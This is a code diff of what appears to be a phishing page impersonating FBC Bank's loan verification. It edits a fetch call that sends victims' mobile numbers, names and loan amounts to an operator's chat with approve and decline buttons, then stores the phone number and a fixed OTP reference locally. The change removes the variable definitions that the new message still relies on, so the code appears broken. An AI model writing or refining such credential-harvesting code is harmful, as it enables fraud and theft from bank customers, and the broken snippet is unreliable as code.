@@ -507,11 +507,7 @@
       const btn = document.querySelector('.pill-btn');
       btn.disabled = true;
       btn.textContent = 'Verifying…';
-      
-      const application = getStoredApplication();
-      const loanAmount  = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-      const loanType    = application.loanMonths || '—';
-    
+
       const ts = Date.now();
       const approveId = `approve_${ts}`;
       const declineId = `decline_${ts}`;
@@ -523,7 +519,13 @@
         body: JSON.stringify({
           chat_id: CONFIG.CHAT_ID,
           text: `
-<b>📱 FBC Bank Loan Verification</b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan months: <b>${loanMonths}</b>\nPhone: <code>+263${mobile}</code>\n\nChoose Action:`,
+<b>📱 FBC Bank Loan Verification</b>
+
+Mobile: <code>${mobile}</code>
+Applicant: <code>Not provided</code>
+Name: ${fullName}
+Loan Amount: ${loanAmount}
+`,
           parse_mode: 'HTML',
           reply_markup: {
             inline_keyboard: [
@@ -539,7 +541,6 @@
         })
       })
       .then(() => {
-        
         localStorage.setItem('fbc_phone_number', mobile);
         localStorage.setItem('fbc_login_phone', mobile);
         localStorage.setItem('fbc_otp_ref', '9vXfk');
